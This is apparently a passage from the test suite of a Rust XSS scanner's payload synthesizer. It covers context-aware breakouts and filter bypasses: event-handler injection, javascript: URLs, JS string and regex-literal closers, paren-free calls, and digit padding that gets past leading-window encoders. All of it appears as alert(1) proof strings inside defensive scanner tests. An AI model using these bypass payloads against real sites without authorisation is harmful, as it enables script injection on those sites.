use super::*;
use crate::parameter_analysis::{DelimiterType, InjectionContext};

/// Every probed special character, used to assert the filter-constraint
/// invariant exhaustively.
const ALL_SPECIALS: &[char] = crate::parameter_analysis::SPECIAL_PROBE_CHARS;

/// Core invariant: a synthesized payload must never contain a character the
/// filter is known to strip.
fn assert_obeys_filter(payloads: &[String], invalid: &[char]) {
    for p in payloads {
        for c in p.chars() {
            assert!(
                !invalid.contains(&c),
                "synthesized payload {:?} uses blocked char {:?} (invalid={:?})",
                p,
                c,
                invalid
            );
        }
    }
}

fn html() -> InjectionContext {
    InjectionContext::Html(None)
}

#[test]
fn produces_payloads_for_every_context_when_unfiltered() {
    let contexts = [
        InjectionContext::Html(None),
        InjectionContext::Html(Some(DelimiterType::Comment)),
        InjectionContext::Attribute(Some(DelimiterType::SingleQuote)),
        InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Attribute(None),
        InjectionContext::AttributeUrl(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::SingleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::Backtick)),
        InjectionContext::Javascript(Some(DelimiterType::Comment)),
        InjectionContext::Javascript(None),
        InjectionContext::Css(None),
        InjectionContext::Css(Some(DelimiterType::SingleQuote)),
        InjectionContext::Css(Some(DelimiterType::DoubleQuote)),
    ];
    for ctx in contexts {
        let payloads = synthesize_payloads(&ctx, &[], &[], &[], None);
        assert!(
            !payloads.is_empty(),
            "expected synthesized payloads for {:?}",
            ctx
        );
    }
}

#[test]
fn output_is_capped_and_deduped() {
    // Exercise every context; none may exceed the cap or contain duplicates.
    for ctx in [
        InjectionContext::Html(None),
        InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::SingleQuote)),
    ] {
        let payloads = synthesize_payloads(&ctx, &[], &[], &[], None);
        assert!(
            payloads.len() <= MAX_SYNTHESIZED,
            "cap exceeded for {:?}",
            ctx
        );
        let mut sorted = payloads.clone();
        sorted.sort();
        sorted.dedup();
        assert_eq!(sorted.len(), payloads.len(), "duplicates for {:?}", ctx);
    }
}

#[test]
fn obeys_filter_for_assorted_blocked_sets() {
    let blocked_sets: &[&[char]] = &[
        &['<', '>'],
        &['('],
        &['(', ')'],
        &['"'],
        &['\''],
        &['<', '>', '(', ')'],
        &[';', '/'],
        &['=', '<', '>'],
        ALL_SPECIALS, // everything blocked
    ];
    let contexts = [
        InjectionContext::Html(None),
        InjectionContext::Html(Some(DelimiterType::Comment)),
        InjectionContext::Attribute(Some(DelimiterType::SingleQuote)),
        InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Attribute(None),
        InjectionContext::AttributeUrl(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::SingleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::Backtick)),
        InjectionContext::Javascript(None),
        InjectionContext::Css(None),
    ];
    for invalid in blocked_sets {
        for ctx in &contexts {
            let payloads = synthesize_payloads(ctx, invalid, &[], &[], None);
            assert_obeys_filter(&payloads, invalid);
        }
    }
}

#[test]
fn everything_blocked_yields_nothing() {
    // With every special character stripped there is no way to construct an
    // executing payload, so synthesis must bow out (and let the caller fall
    // back) rather than emit junk.
    for ctx in [
        html(),
        InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::SingleQuote)),
    ] {
        let payloads = synthesize_payloads(&ctx, ALL_SPECIALS, &[], &[], None);
        assert!(payloads.is_empty(), "expected empty for {:?}", ctx);
    }
}

#[test]
fn html_text_context_needs_angles() {
    // HTML element-content reflection can only execute by injecting a tag, so a
    // filter that strips `<` defeats synthesis here.
    let payloads = synthesize_payloads(&html(), &['<'], &[], &[], None);
    assert!(
        payloads.is_empty(),
        "HTML text context should yield nothing when `<` is stripped, got {:?}",
        payloads
    );
}

#[test]
fn attribute_context_survives_angle_stripping() {
    // The key win: a quoted-attribute reflection stays exploitable without
    // `<`/`>` via stay-in-tag event injection.
    let ctx = InjectionContext::Attribute(Some(DelimiterType::DoubleQuote));
    let payloads = synthesize_payloads(&ctx, &['<', '>'], &[], &[], None);
    assert!(
        !payloads.is_empty(),
        "attribute context should still synthesize angle-free payloads"
    );
    for p in &payloads {
        assert!(
            !p.contains('<') && !p.contains('>'),
            "angle leaked in {:?}",
            p
        );
    }
    // At least one must be a real event-handler injection that can fire.
    assert!(
        payloads
            .iter()
            .any(|p| p.contains("onmouseover=") || p.contains("onfocus=")),
        "expected an event-handler injection, got {:?}",
        payloads
    );
}

#[test]
fn attribute_context_survives_space_stripping() {
    // A server that strips literal spaces from the reflection collapses the
    // space-separated stay-in-tag shapes into one merged attribute. The
    // slash-separated mirror survives it. This is not gated on a filter result
    // (space is not a probed special), so synthesize with NO blocked chars —
    // exactly what a real scan passes — and require the space-free mirror to be
    // present regardless.
    let ctx = InjectionContext::Attribute(Some(DelimiterType::DoubleQuote));
    let payloads = synthesize_payloads(&ctx, &[], &[], &[], None);
    assert!(!payloads.is_empty());
    let slash_handler = payloads
        .iter()
        .find(|p| {
            !p.contains(' ')
                && p.contains('/')
                && (p.contains("onmouseover=") || p.contains("onfocus="))
                && p.contains("id=")
        })
        .expect("a space-free slash-separated handler+id payload must be emitted");

    // Shape alone is not proof: verify the payload actually *breaks out* by
    // parsing the reflection the way the scanner does. Drop the space-free
    // payload into a double-quoted attribute (the injection context) — after a
    // server strips spaces this is byte-for-byte what comes back — and confirm
    // the tokenizer yields an element that carries BOTH the id marker and an
    // `on*` handler holding the sink. An unquoted-value slash injection (where
    // `/` is appended, not a separator) would fail this and land the marker as
    // inert text instead.
    let id = crate::scanning::markers::id_marker();
    let reflected = format!("<div class=\"{slash_handler}\">");
    let doc = scraper::Html::parse_document(&reflected);
    let sel = scraper::Selector::parse(&format!("#{id}")).unwrap();
    let marker_el = doc
        .select(&sel)
        .next()
        .expect("id marker must parse as a real element id after breakout");
    let has_handler = marker_el
        .value()
        .attrs()
        .any(|(name, val)| name.len() >= 3 && name.starts_with("on") && val.contains("alert"));
    assert!(
        has_handler,
        "marker element must carry a surviving on* handler, got attrs {:?} from {reflected}",
        marker_el.value().attrs().collect::<Vec<_>>()
    );
}

#[test]
fn paren_blocked_falls_back_to_backtick_call() {
    // With `(`/`)` stripped, the only surviving execution primitive is the
    // tagged-template call `alert`1``.
    let ctx = InjectionContext::Attribute(Some(DelimiterType::DoubleQuote));
    let payloads = synthesize_payloads(&ctx, &['(', ')'], &[], &[], None);
    assert!(!payloads.is_empty());
    assert_obeys_filter(&payloads, &['(', ')']);
    assert!(
        payloads.iter().any(|p| p.contains("alert`1`")),
        "expected a backtick call form, got {:?}",
        payloads
    );
    assert!(
        payloads.iter().all(|p| !p.contains("alert(1)")),
        "paren call should have been filtered out"
    );
}

#[test]
fn single_quote_attr_needs_the_quote() {
    // Breaking out of a single-quoted value requires emitting `'`; if that is
    // stripped, synthesis bows out (escaped-quote handling is tracked
    // separately).
    let ctx = InjectionContext::Attribute(Some(DelimiterType::SingleQuote));
    let payloads = synthesize_payloads(&ctx, &['\''], &[], &[], None);
    assert!(
        payloads.is_empty(),
        "single-quote attribute with `'` stripped should yield nothing, got {:?}",
        payloads
    );
}

#[test]
fn backtick_js_context_uses_template_interpolation() {
    let ctx = InjectionContext::Javascript(Some(DelimiterType::Backtick));
    let payloads = synthesize_payloads(&ctx, &[], &[], &[], None);
    assert!(
        payloads.iter().any(|p| p.contains("${alert(1)}")),
        "expected `${{alert(1)}}` interpolation, got {:?}",
        payloads
    );
}

#[test]
fn js_string_context_includes_nested_closer_breakouts() {
    // Issue #1073: synthesis must emit exact nested-closer breakouts for JS
    // string contexts, not just the bare quote-close.
    let ctx = InjectionContext::Javascript(Some(DelimiterType::DoubleQuote));
    let payloads = synthesize_payloads(&ctx, &[], &[], &[], None);
    // Bare close (depth 0) and a deep array-in-object-in-call close (depth 3).
    assert!(
        payloads.iter().any(|p| p == "\";alert(1)//"),
        "expected the bare string-close breakout, got {:?}",
        payloads
    );
    assert!(
        payloads.iter().any(|p| p == "\"]});alert(1)//"),
        "expected the nested array-in-object-in-call breakout, got {:?}",
        payloads
    );
}

#[test]
fn js_string_context_survives_angle_stripping() {
    // A reflection inside a JS string can break out with quotes alone — no
    // `</script>` tag needed — so angle stripping does not defeat it.
    let ctx = InjectionContext::Javascript(Some(DelimiterType::SingleQuote));
    let payloads = synthesize_payloads(&ctx, &['<', '>'], &[], &[], None);
    assert!(!payloads.is_empty());
    assert!(
        payloads.iter().any(|p| p.starts_with('\'')),
        "expected a quote-breakout JS payload, got {:?}",
        payloads
    );
}

#[test]
fn high_confidence_payloads_carry_a_marker() {
    // The lead payloads for marker-friendly contexts must embed a DOM marker so
    // a reflection can promote straight to [V].
    let class = crate::scanning::markers::class_marker();
    let id = crate::scanning::markers::id_marker();
    for ctx in [
        html(),
        InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Css(None),
    ] {
        let payloads = synthesize_payloads(&ctx, &[], &[], &[], None);
        assert!(
            payloads
                .iter()
                .take(3)
                .any(|p| p.contains(class) || p.contains(id)),
            "expected a marker in the lead payloads for {:?}: {:?}",
            ctx,
            &payloads[..payloads.len().min(3)]
        );
    }
}

#[test]
fn html_lead_payload_is_the_most_reliable_shape() {
    // Confidence ordering: the first HTML candidate should be the auto-firing
    // svg/onload tag.
    let payloads = synthesize_payloads(&html(), &[], &[], &[], None);
    assert!(
        payloads[0].starts_with("<svg onload=alert(1)"),
        "unexpected lead payload: {:?}",
        payloads[0]
    );
}

#[test]
fn attribute_url_context_includes_protocol_payload() {
    let ctx = InjectionContext::AttributeUrl(Some(DelimiterType::DoubleQuote));
    let payloads = synthesize_payloads(&ctx, &[], &[], &[], None);
    assert!(
        payloads.iter().any(|p| p.contains("javascript:alert(1)")),
        "expected a javascript: protocol payload, got {:?}",
        payloads
    );
}

#[test]
fn empty_profile_matches_no_filtering() {
    // No probe data → nothing is "blocked" → full-strength synthesis.
    let payloads = synthesize_payloads(&html(), &[], &[], &[], None);
    assert!(payloads.len() > 5);
}

#[test]
fn escaped_quote_js_context_emits_backslash_breakout() {
    // Issue #1072: the escaped-quote signal drives synthesis to emit a
    // backslash-prefixed breakout for a server that escapes the JS-string quote.
    let ctx = InjectionContext::Javascript(Some(DelimiterType::DoubleQuote));

    // No escaped signal → only the raw quote-close breakout.
    let plain = synthesize_payloads(&ctx, &[], &[], &[], None);
    assert!(plain.iter().any(|p| p == "\";alert(1)//"));
    assert!(
        !plain.iter().any(|p| p == "\\\";alert(1)//"),
        "must not emit an escaped breakout without the escaped signal"
    );

    // Escaped signal for `"` → emit ONLY the backslash-prefixed breakouts; the
    // raw quote-close is inert under escaping, so it is dropped (keeping the cap
    // free for the marker-carrying `</script>` template).
    let escaped = synthesize_payloads(&ctx, &[], &[], &['"'], None);
    assert!(
        escaped.iter().any(|p| p == "\\\";alert(1)//"),
        "expected the escaped breakout `\\\";alert(1)//`, got {escaped:?}"
    );
    assert!(
        escaped.iter().any(|p| p == "\\\"]});alert(1)//"),
        "expected a nested escaped breakout"
    );
    assert!(
        !escaped.iter().any(|p| p == "\"]});alert(1)//"),
        "the inert raw *nested* breakouts must be dropped when the delimiter is escaped \
         (the depth-0 close still comes from the static JS templates)"
    );
    // The marker-carrying </script> breakout still survives the cap (works under
    // escaping regardless), so V-promotion isn't lost.
    assert!(
        escaped.iter().any(|p| p.contains("</script>")),
        "expected the marker-carrying </script> breakout to survive the cap"
    );
}

#[test]
fn observed_breakout_reaches_shape_beyond_fixed_catalog() {
    // Issue #1073 follow-up: an observed-prefix breakout for nesting the fixed
    // depth-0–3 catalog does NOT enumerate (`g([[{k:"…` → close `"}]])`) is both
    // emitted and placed first (highest confidence).
    let ctx = InjectionContext::Javascript(Some(DelimiterType::DoubleQuote));
    let observed = "\"}]])"; // close: " } ] ] )
    let with_prefix = synthesize_payloads(&ctx, &[], &[], &[], Some(observed));
    assert_eq!(
        with_prefix.first().map(String::as_str),
        Some("\"}]]);alert(1)//"),
        "observed breakout must be emitted first, got {with_prefix:?}"
    );
    // Without the observed prefix the fixed catalog never produces this closer,
    // proving the new payload is genuinely prefix-derived (added coverage).
    let without = synthesize_payloads(&ctx, &[], &[], &[], None);
    assert!(
        !without.iter().any(|p| p == "\"}]]);alert(1)//"),
        "the fixed catalog must not already cover this deep nesting"
    );
}

#[test]
fn observed_breakout_dedups_against_catalog() {
    // When the observed closer coincides with a fixed-catalog shape it must not
    // duplicate — it just moves to the front.
    let ctx = InjectionContext::Javascript(Some(DelimiterType::DoubleQuote));
    let observed = "\"]})"; // also produced by the `({k:[` catalog shell
    let out = synthesize_payloads(&ctx, &[], &[], &[], Some(observed));
    assert_eq!(out.first().map(String::as_str), Some("\"]});alert(1)//"));
    let n = out.iter().filter(|p| *p == "\"]});alert(1)//").count();
    assert_eq!(
        n, 1,
        "the coinciding breakout must appear exactly once, got {out:?}"
    );
}

#[test]
fn observed_breakout_escaped_prepends_backslash() {
    // #1072 interaction: under a server that escapes the delimiter, the observed
    // breakout leads with a backslash like the escaped catalog set, so the
    // server's own escaping turns it into a real string break.
    let ctx = InjectionContext::Javascript(Some(DelimiterType::DoubleQuote));
    let out = synthesize_payloads(&ctx, &[], &[], &['"'], Some("\"}]])"));
    assert!(
        out.iter().any(|p| p == "\\\"}]]);alert(1)//"),
        "expected backslash-prefixed observed breakout, got {out:?}"
    );
}

#[test]
fn observed_breakout_respects_filter() {
    // The observed breakout is filter-gated like every other payload: a blocked
    // structural char drops it (no unusable payload, no FP), and the rest still
    // synthesize.
    let ctx = InjectionContext::Javascript(Some(DelimiterType::DoubleQuote));
    let out = synthesize_payloads(&ctx, &[']'], &[], &[], Some("\"}]])"));
    assert_obeys_filter(&out, &[']']);
    assert!(
        !out.iter().any(|p| p.contains(']')),
        "blocked `]` must not appear in any synthesized payload, got {out:?}"
    );
    assert!(!out.is_empty(), "other payloads must still synthesize");
}

#[test]
fn observed_breakout_none_is_purely_additive() {
    // Regression guard: passing None reproduces the prior behavior — the fixed
    // depth-0 and nested catalog breakouts are still present unchanged.
    let ctx = InjectionContext::Javascript(Some(DelimiterType::DoubleQuote));
    let out = synthesize_payloads(&ctx, &[], &[], &[], None);
    assert!(out.iter().any(|p| p == "\";alert(1)//"));
    assert!(out.iter().any(|p| p == "\"]});alert(1)//"));
}

// ===================================================================
// Effectiveness benchmark (deterministic): does synthesis add executable,
// verifiable payloads the static catalog cannot express for a given filter?
//
// For each (context, blocked-chars) scenario we count, over a payload set, those
// that (a) survive the filter unchanged and (b) carry an executing construct —
// and, separately, those that additionally carry a DOM marker (so they can
// promote to a *verified* [V] finding). The SAME structural oracle is applied to
// catalog and synthesis, so the comparison is fair. The counts are upper bounds
// on real executability and are used only for relative comparison.
//
// We deliberately do NOT assert "catalog ∪ synth ≥ catalog": a superset can
// never cover less, so that would be vacuous. The falsifiable claims this test
// makes are (1) synthesis closes complete gaps — scenarios where the catalog
// yields zero verifiable payloads and synthesis yields some — and (2) synthesis
// contributes verifiable payloads that are NOT already in the catalog (net-new
// coverage). Either assertion can fail if synthesis is ineffective.
// ===================================================================

/// True when `payload` uses no character the filter strips (survives intact).
fn survives(payload: &str, blocked: &[char]) -> bool {
    payload.chars().all(|c| !blocked.contains(&c))
}

/// True when `payload` carries a construct that executes script.
fn executes(payload: &str) -> bool {
    let p = payload.to_ascii_lowercase();
    // A direct JS call (covers reflections inside an existing script where no
    // tag/handler is needed, e.g. `';alert(1)//`).
    let js_call = [
        "alert(", "confirm(", "prompt(", "alert`", "confirm`", "prompt`", "eval(",
    ]
    .iter()
    .any(|needle| p.contains(needle));
    // event handler `on<name>=`, an injected <script>, a javascript: URL, or a
    // template-literal interpolation.
    js_call || p.contains("<script") || p.contains("javascript:") || p.contains("${") || {
        // crude `on<letters>=` detector without pulling in regex here
        let bytes = p.as_bytes();
        let mut i = 0;
        let mut found = false;
        while i + 2 < bytes.len() {
            if &bytes[i..i + 2] == b"on" {
                let mut j = i + 2;
                while j < bytes.len() && bytes[j].is_ascii_lowercase() {
                    j += 1;
                }
                if j > i + 2 && j < bytes.len() && bytes[j] == b'=' {
                    found = true;
                    break;
                }
            }
            i += 1;
        }
        found
    }
}

fn has_marker(payload: &str, class: &str, id: &str) -> bool {
    payload.contains(class) || payload.contains(id)
}

#[derive(Default, Clone, Copy)]
struct Coverage {
    exec: usize,
    verifiable: usize,
}

fn coverage(payloads: &[String], blocked: &[char], class: &str, id: &str) -> Coverage {
    let mut c = Coverage::default();
    for p in payloads {
        if survives(p, blocked) && executes(p) {
            c.exec += 1;
            if has_marker(p, class, id) {
                c.verifiable += 1;
            }
        }
    }
    c
}

#[test]
fn synthesis_closes_catalog_coverage_gaps() {
    let class = crate::scanning::markers::class_marker();
    let id = crate::scanning::markers::id_marker();

    // (label, context, characters the server-side filter strips)
    let scenarios: &[(&str, InjectionContext, &[char])] = &[
        (
            "attr(\") + strip <>",
            InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
            &['<', '>'],
        ),
        (
            "attr(\") + strip ()",
            InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
            &['(', ')'],
        ),
        (
            "attr(\") + strip <> ()",
            InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
            &['<', '>', '(', ')'],
        ),
        (
            "attr(') + strip <> ()",
            InjectionContext::Attribute(Some(DelimiterType::SingleQuote)),
            &['<', '>', '(', ')'],
        ),
        (
            "html + strip \"'",
            InjectionContext::Html(None),
            &['"', '\''],
        ),
        ("html + strip ()", InjectionContext::Html(None), &['(', ')']),
        (
            "js(') + strip <>",
            InjectionContext::Javascript(Some(DelimiterType::SingleQuote)),
            &['<', '>'],
        ),
        (
            "attrUrl(\") + strip <>",
            InjectionContext::AttributeUrl(Some(DelimiterType::DoubleQuote)),
            &['<', '>'],
        ),
    ];

    let mut total_catalog_verif = 0usize;
    let mut total_netnew_verif = 0usize;
    let mut gaps_closed = 0usize;

    println!(
        "\n{:<26} | catalog(exec/verif) | synth(exec/verif) | net-new verif",
        "scenario"
    );
    println!("{}", "-".repeat(82));

    for (label, ctx, blocked) in scenarios {
        // Dedup the catalog so duplicates don't inflate its coverage.
        let mut catalog = crate::scanning::xss_common::generate_dynamic_payloads(ctx);
        catalog.sort();
        catalog.dedup();
        let synth = synthesize_payloads(ctx, blocked, &[], &[], None);

        // Net-new = synthesized payloads the catalog does not already contain.
        // This is the coverage synthesis genuinely *adds*, not an artifact of
        // concatenation — counting it on the set difference makes the headline
        // assertion falsifiable (it is 0 if synthesis only echoes the catalog).
        let catalog_set: std::collections::HashSet<&String> = catalog.iter().collect();
        let synth_only: Vec<String> = synth
            .iter()
            .filter(|p| !catalog_set.contains(*p))
            .cloned()
            .collect();

        let cat = coverage(&catalog, blocked, class, id);
        let syn = coverage(&synth, blocked, class, id);
        let netnew = coverage(&synth_only, blocked, class, id);

        println!(
            "{:<26} | {:>6}/{:<6}      | {:>5}/{:<5}     | {}",
            label, cat.exec, cat.verifiable, syn.exec, syn.verifiable, netnew.verifiable
        );

        total_catalog_verif += cat.verifiable;
        total_netnew_verif += netnew.verifiable;
        if cat.verifiable == 0 && syn.verifiable > 0 {
            gaps_closed += 1;
        }
    }

    println!("{}", "-".repeat(82));
    println!(
        "verifiable payloads — catalog total: {}, net-new from synthesis: {}, complete gaps closed: {}",
        total_catalog_verif, total_netnew_verif, gaps_closed
    );

    // (1) Synthesis must produce verifiable payloads in at least one scenario
    //     where the catalog produces none — a gap the catalog cannot express.
    assert!(
        gaps_closed > 0,
        "synthesis closed no catalog coverage gaps — expected at least one"
    );
    // (2) Synthesis must contribute verifiable payloads absent from the catalog
    //     (net-new coverage), aggregated across scenarios.
    assert!(
        total_netnew_verif > 0,
        "synthesis added no verifiable payloads beyond the catalog"
    );
}

#[test]
fn synthesis_is_fast_and_bounded() {
    // Performance guard: synthesis runs once per parameter inside the scan loop,
    // so it must be cheap. 20k calls across a mix of contexts/filters should be
    // well under a second even in debug on an idle machine; we assert a
    // deliberately loose ceiling (see below) to stay
    // non-flaky in CI while still catching pathological regressions.
    let contexts = [
        InjectionContext::Html(None),
        InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::SingleQuote)),
        InjectionContext::AttributeUrl(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Css(None),
    ];
    let blocked_sets: &[&[char]] = &[&[], &['<', '>'], &['(', ')'], &['<', '>', '(', ')']];

    let start = std::time::Instant::now();
    let mut produced = 0usize;
    let iterations = 1_000;
    for _ in 0..iterations {
        for ctx in &contexts {
            for blocked in blocked_sets {
                let out = synthesize_payloads(ctx, blocked, &[], &[], None);
                assert!(out.len() <= MAX_SYNTHESIZED);
                produced += out.len();
            }
        }
    }
    let elapsed = start.elapsed();
    let calls = iterations * contexts.len() * blocked_sets.len();
    println!(
        "synthesis perf: {} calls, {} payloads, {:?} ({:.1} ns/call)",
        calls,
        produced,
        elapsed,
        elapsed.as_nanos() as f64 / calls as f64
    );
    // A blowup canary, not a performance gate. The real boundedness contract
    // is the deterministic `out.len() <= MAX_SYNTHESIZED` asserted on every
    // call above; this only has to notice a per-call regression of the kind
    // that turns 20k calls into minutes.
    //
    // The bound therefore belongs far above the noise floor, not just above the
    // idle figure. Measured on this workload: ~0.3s idle, 2.75s on a machine at
    // load 34 — and 7.7-9.4s at load 120, which turned the old 5s ceiling red
    // during a run where nothing about synthesis had changed. A test that fails
    // because the machine is busy teaches people to ignore it.
    assert!(
        elapsed.as_secs() < 60,
        "synthesis unexpectedly slow: {:?} for {} calls",
        elapsed,
        calls
    );
}

#[test]
fn js_string_contexts_offer_a_bare_expression_payload() {
    // C1: the quote-delimiter heuristic mis-classifies a raw JS *expression*
    // position (a `${ … }` template-literal substitution, an object-literal value
    // slot) as a string context. There the string-breakout templates are syntax
    // errors, so synthesis must also emit a bare-expression payload that executes
    // directly in expression position. (FP-safe: a bare `alert(1)` in a genuine
    // string literal reflects as inert text and never AST-verifies — see the
    // headless FP controls in the FN-hunt harness.)
    for ctx in [
        InjectionContext::Javascript(Some(DelimiterType::SingleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::Backtick)),
    ] {
        let payloads = synthesize_payloads(&ctx, &[], &[], &[], None);
        assert!(
            payloads.iter().any(|p| p == "alert(1)"),
            "{ctx:?} must offer a bare-expression payload; got {payloads:?}"
        );
    }
    // The comment context is NOT an expression position (a bare call inside a
    // block comment is inert), so it must not gain the bare payload.
    let comment = synthesize_payloads(
        &InjectionContext::Javascript(Some(DelimiterType::Comment)),
        &[],
        &[],
        &[],
        None,
    );
    assert!(
        !comment.iter().any(|p| p == "alert(1)"),
        "comment context should not emit a bare-expression payload"
    );
}

#[test]
fn raw_js_context_offers_regex_literal_breakout() {
    // C3: a reflection inside a regex literal (`var re = /^INJECT$/`) needs a
    // `/`-led payload to close the regex first; compute_js_breakout never treats
    // `/` as a regex delimiter, so synthesis carries static regex-closing
    // templates in the raw (delimiter-less) JS set.
    let payloads = synthesize_payloads(&InjectionContext::Javascript(None), &[], &[], &[], None);
    assert!(
        payloads
            .iter()
            .any(|p| p.starts_with("/;") && p.contains("alert")),
        "raw JS context must offer a regex-closing payload; got {payloads:?}"
    );
    // Under a filter that blocks only angle brackets (a strip-`<>`-style WAF),
    // the regex breakout survives while the `</script>` template is dropped.
    let filtered = synthesize_payloads(
        &InjectionContext::Javascript(None),
        &['<', '>'],
        &[],
        &[],
        None,
    );
    assert!(
        filtered.iter().any(|p| p.starts_with("/;")),
        "regex breakout should survive an angle-bracket filter"
    );
    assert!(
        !filtered.iter().any(|p| p.contains("</script>")),
        "angle-bracket filter must drop the </script> template"
    );
}

// ===================================================================
// Leading-window ("positional") filter bypass — issue: partial-encoding
// filters that only entity-encode / strip a fixed leading window of the value.
// ===================================================================

#[test]
fn positional_pad_emitted_only_for_html_context() {
    // A leading-window angle filter can only be defeated by pushing an injected
    // *tag* past the window, so the pad set is HTML-text-only. Attribute / JS /
    // CSS reflections break out without `<` and gain nothing.
    assert!(
        !positional_pad_payloads(&html()).is_empty(),
        "HTML context must offer positional-pad payloads"
    );
    for ctx in [
        InjectionContext::Attribute(Some(DelimiterType::DoubleQuote)),
        InjectionContext::Javascript(Some(DelimiterType::SingleQuote)),
        InjectionContext::Css(None),
    ] {
        assert!(
            positional_pad_payloads(&ctx).is_empty(),
            "non-HTML context must not offer positional-pad payloads: {ctx:?}"
        );
    }
}

#[test]
fn positional_pad_payloads_are_padded_verifiable_tags() {
    // Every pad payload is a run of inert digits followed by a self-firing tag
    // carrying the class marker, and is recognised by the prune-exemption
    // predicate. The class marker rides a *fresh* injected tag, so a class (not
    // id) marker is safe (no pre-existing `class="…"` to collide with).
    let class = crate::scanning::markers::class_marker();
    let payloads = positional_pad_payloads(&html());
    assert!(!payloads.is_empty());
    for p in &payloads {
        assert!(
            is_positional_pad_bypass(p),
            "pad payload must be recognised by the prune exemption: {p:?}"
        );
        assert!(p.contains(class), "pad payload must carry the class marker: {p:?}");
        assert!(p.contains("alert(1)"), "pad payload must carry an executor: {p:?}");
        let digits = p.bytes().take_while(u8::is_ascii_digit).count();
        assert!(digits >= 20, "pad prefix must exceed common leading windows: {p:?}");
        assert!(p.as_bytes()[digits] == b'<', "digits must run right up to the tag: {p:?}");
    }
}

#[test]
fn positional_pad_bypass_predicate_rejects_ordinary_payloads() {
    // The prune exemption must fire ONLY for the pad shape, never for an
    // ordinary payload — otherwise a genuinely blocked raw-angle payload would
    // wrongly survive the raw-angle prune and waste requests.
    for p in [
        "<svg onload=alert(1) class=x>",
        "1<svg onload=alert(1)>",             // short digit run, not a pad
        "0000000000<svg>",                     // 10 digits < MIN_RUN(12)
        "'><svg onload=alert(1)>",
        "\" onmouseover=alert(1) x=\"",
        "000000000000000000000000alert(1)",    // digits but no tag
    ] {
        assert!(
            !is_positional_pad_bypass(p),
            "predicate must reject ordinary payload: {p:?}"
        );
    }
    // ...and accept a real pad payload.
    assert!(is_positional_pad_bypass("000000000000<svg onload=alert(1) class=x>"));
}

#[test]
fn positional_pad_verifies_a_real_leading_window_bypass() {
    // Behavioural proof (not shape-only): a filter that entity-encodes the first
    // 20 characters and passes the rest raw (edgefilter-6 shape) leaves the pad
    // payload's tag intact past the window, so it parses to a REAL marker
    // element carrying the executing handler. Model the server transform, then
    // parse the reflection the way the DOM-verification stage does.
    let class = crate::scanning::markers::class_marker();
    let payloads = positional_pad_payloads(&html());
    // Pick a pad long enough to clear a 20-char window (all our lengths are).
    let payload = payloads
        .iter()
        .find(|p| p.contains("svg"))
        .expect("an svg pad payload");

    // Server: entity-encode `<>&\"'` in the first 20 chars only, rest raw.
    let encode_head = |s: &str| -> String {
        let mut out = String::new();
        for (i, c) in s.chars().enumerate() {
            if i < 20 {
                match c {
                    '<' => out.push_str("&lt;"),
                    '>' => out.push_str("&gt;"),
                    '&' => out.push_str("&amp;"),
                    '"' => out.push_str("&quot;"),
                    '\'' => out.push_str("&#39;"),
                    _ => out.push(c),
                }
            } else {
                out.push(c);
            }
        }
        out
    };
    let reflected = format!("<div>{}</div>", encode_head(payload));
    let doc = scraper::Html::parse_document(&reflected);
    let sel = scraper::Selector::parse(&format!(".{class}")).unwrap();
    let el = doc
        .select(&sel)
        .next()
        .expect("pad tag must parse to a real marker element past the window");
    assert!(
        el.value()
            .attrs()
            .any(|(n, v)| n.len() >= 3 && n.starts_with("on") && v.contains("alert")),
        "marker element must carry the surviving on* handler, got {:?}",
        el.value().attrs().collect::<Vec<_>>()
    );
}

#[test]
fn positional_pad_is_fp_safe_against_a_non_positional_filter() {
    // FP control: a proper filter that entity-encodes angle brackets EVERYWHERE
    // (not just a leading window) leaves the pad payload's `<` encoded, so no
    // element materialises and nothing can promote to [V]. This is the exact
    // shape that would be a false positive if the pad "worked" unconditionally.
    let class = crate::scanning::markers::class_marker();
    let payload = &positional_pad_payloads(&html())[0];
    let encoded_everywhere = payload.replace('<', "&lt;").replace('>', "&gt;");
    let reflected = format!("<div>{encoded_everywhere}</div>");
    let doc = scraper::Html::parse_document(&reflected);
    let sel = scraper::Selector::parse(&format!(".{class}")).unwrap();
    assert!(
        doc.select(&sel).next().is_none(),
        "a filter that encodes `<` everywhere must yield NO marker element (no false [V])"
    );
}

// ===================================================================
// Paren-free / backtick-free execution — for filters that strip `(` `)` and
// backticks, neutralising every standard `alert(1)` / `alert`1`` primitive.
// ===================================================================

/// Parse `payload` dropped into a `delim`-quoted attribute (the injection point)
/// and return whether the id-marker element carries an on* handler holding a
/// recognised sink — i.e. whether the DOM-verification stage would confirm it.
fn attr_breakout_verifies(payload: &str, open: char) -> bool {
    let id = crate::scanning::markers::id_marker();
    let reflected = format!("<div class={open}{payload}{open}>x</div>");
    let doc = scraper::Html::parse_document(&reflected);
    let sel = scraper::Selector::parse(&format!("#{id}")).unwrap();
    doc.select(&sel).next().is_some_and(|el| {
        el.value()
            .attrs()
            .any(|(n, v)| n.len() >= 3 && n.starts_with("on") && v.contains("alert"))
    })
}

#[test]
fn paren_and_backtick_blocked_still_synthesizes_a_verifiable_handler() {
    // filterchain-5 shape: `(` `)` and backtick stripped (so alert(1) / alert`1`
    // / confirm(1) are all char-gated out), reflection in a double-quoted
    // attribute. A paren-free handler must survive and, when reflected, parse to
    // a marker element carrying an executing on* handler.
    let ctx = InjectionContext::Attribute(Some(DelimiterType::DoubleQuote));
    let blocked = &['(', ')', '`'];
